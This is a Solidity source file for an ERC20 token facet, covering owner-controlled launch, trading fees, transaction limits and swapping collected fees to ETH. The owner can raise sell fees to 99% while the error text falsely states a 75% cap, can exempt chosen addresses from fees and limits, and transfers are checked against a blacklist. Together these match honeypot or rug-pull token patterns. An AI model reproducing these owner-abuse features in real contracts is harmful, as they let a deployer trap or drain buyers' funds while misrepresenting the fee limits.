// SPDX-License-Identifier: MIT

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract startTradingFacet is ERC20, Ownable {
    using SafeMath for uint256;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event marketerWalletUpdated(
        address indexed newWallet,
        address indexed olDevsWalletallet
    );
    event DevsWalletUpdated(
        address indexed newWallet,
        address indexed olDevsWalletallet
    );
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function startTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.tradingActive = true;
        ds.swapEnabled = true;
    }
    function prepareToLaunch() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyMarketingFee = 30;
        ds.buyDevFee = 0;
        ds.sellMarketingFee = 30;
        ds.sellDevFee = 0;
        ds.buyTotalFees = ds.buyMarketingFee + ds.buyDevFee;
        ds.sellTotalFees = ds.sellMarketingFee + ds.sellDevFee;
    }
    function toggleLimits() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function disableTransferDelay() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.transferDelayEnabled = false;
        return true;
    }
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        ds.swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set ds.maxTx lower than 0.1%"
        );
        ds.maxTx = newNum * (10 ** 18);
    }
    function updatemaxWalletsAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set ds.maxWallets lower than 0.5%"
        );
        ds.maxWallets = newNum * (10 ** 18);
    }
    function excludeFrommaxTx(address updAds, bool isEx) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedmaxTx[updAds] = isEx;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyMarketingFee = _marketingFee;
        ds.buyDevFee = _devFee;
        ds.buyTotalFees = ds.buyMarketingFee + ds.buyDevFee;
        require(ds.buyTotalFees <= 75, "Must keep fees at 75% or less");
    }
    function updateSellFees(
        uint256 _marketingFee,
        uint256 _devFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellMarketingFee = _marketingFee;
        ds.sellDevFee = _devFee;
        ds.sellTotalFees = ds.sellMarketingFee + ds.sellDevFee;
        require(ds.sellTotalFees <= 99, "Must keep fees at 75% or less");
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapV2Pair,
            "The pair cannot be removed from ds.automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
    function updatemarketerWallet(
        address newmarketerWallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit marketerWalletUpdated(newmarketerWallet, ds.marketerWallet);
        ds.marketerWallet = newmarketerWallet;
    }
    function updateDevsWallet(address newWallet) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit DevsWalletUpdated(newWallet, ds.DevsWallet);
        ds.DevsWallet = newWallet;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!ds._isBlackList[from], "[from] black list");
        require(!ds._isBlackList[to], "[to] black list");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (ds.transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(ds.uniswapV2Router) &&
                        to != address(ds.uniswapV2Pair)
                    ) {
                        require(
                            ds._holderLastTransferTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        ds._holderLastTransferTimestamp[tx.origin] = block
                            .number;
                    }
                }

                //when buy
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedmaxTx[to]
                ) {
                    require(
                        amount <= ds.maxTx,
                        "Buy transfer amount exceeds the ds.maxTx."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallets,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedmaxTx[from]
                ) {
                    require(
                        amount <= ds.maxTx,
                        "Sell transfer amount exceeds the ds.maxTx."
                    );
                } else if (!ds._isExcludedmaxTx[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallets,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= ds.swapTokensAtAmount;

        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            ds.swapping = true;

            swapBack();

            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (ds.automatedMarketMakerPairs[to] && ds.sellTotalFees > 0) {
                fees = amount.mul(ds.sellTotalFees).div(100);
                ds.tokensForDev += (fees * ds.sellDevFee) / ds.sellTotalFees;
                ds.tokensForMarkets +=
                    (fees * ds.sellMarketingFee) /
                    ds.sellTotalFees;
            }
            // on buy
            else if (
                ds.automatedMarketMakerPairs[from] && ds.buyTotalFees > 0
            ) {
                fees = amount.mul(ds.buyTotalFees).div(100);
                ds.tokensForDev += (fees * ds.buyDevFee) / ds.buyTotalFees;
                ds.tokensForMarkets +=
                    (fees * ds.buyMarketingFee) /
                    ds.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForMarkets + ds.tokensForDev;
        bool success;

        if (contractBalance == 0) {
            return;
        }

        if (contractBalance > ds.swapTokensAtAmount * 20) {
            contractBalance = ds.swapTokensAtAmount * 20;
        }

        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(contractBalance);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForDev = ethBalance.mul(ds.tokensForDev).div(
            totalTokensToSwap
        );

        ds.tokensForMarkets = 0;
        ds.tokensForDev = 0;

        (success, ) = address(ds.DevsWallet).call{value: ethForDev}("");
        (success, ) = address(ds.marketerWallet).call{
            value: address(this).balance
        }("");
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function manualSwap(uint256 amount) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_msgSender() == ds.marketerWallet);
        require(
            amount <= balanceOf(address(this)) && amount > 0,
            "Wrong amount"
        );
        swapTokensForEth(amount);
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
}
